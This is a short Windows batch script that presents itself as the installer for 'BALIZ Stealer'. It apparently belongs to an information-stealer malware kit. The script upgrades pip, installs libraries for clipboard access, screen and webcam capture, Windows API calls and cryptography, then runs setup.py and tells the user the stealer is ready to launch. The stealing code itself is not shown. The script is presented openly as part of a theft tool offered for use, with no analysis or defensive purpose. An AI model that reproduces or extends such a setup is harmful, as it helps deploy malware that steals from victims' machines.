@echo off
title BALIZ Stealer - Setup Installer
color 4
mode con: cols=85 lines=30


cls
echo.
echo [#]===============================================================[#]
echo           B A L I Z   S T E A L E R   -   I N S T A L L E R
echo [#]===============================================================[#]
echo.


echo [*] Step 1: Upgrading pip to the latest version...
python -m pip install --upgrade pip >nul 2>&1
echo     [+] Pip has been successfully upgraded.
echo.


set PACKAGES=customtkinter Pillow requests psutil pyperclip pyautogui opencv-python pywin32 pycryptodome

echo [*] Step 2: Installing required Python dependencies...
echo.

for %%P in (%PACKAGES%) do (
    echo     [+] Installing %%P...
    pip install %%P >nul 2>&1
    if errorlevel 1 (
        echo         [!] Failed to install %%P. Please check your internet or Python setup.
    ) else (
        echo         [+] %%P installed successfully.
    )
    echo.
)

echo [*] Step 3: installing setup.py
setup.py install

echo [#]---------------------------------------------------------------[#]
echo                All Python dependencies are installed.
echo                You can now launch your BALIZ Stealer.
echo [#]---------------------------------------------------------------[#]
echo.
pause>nul
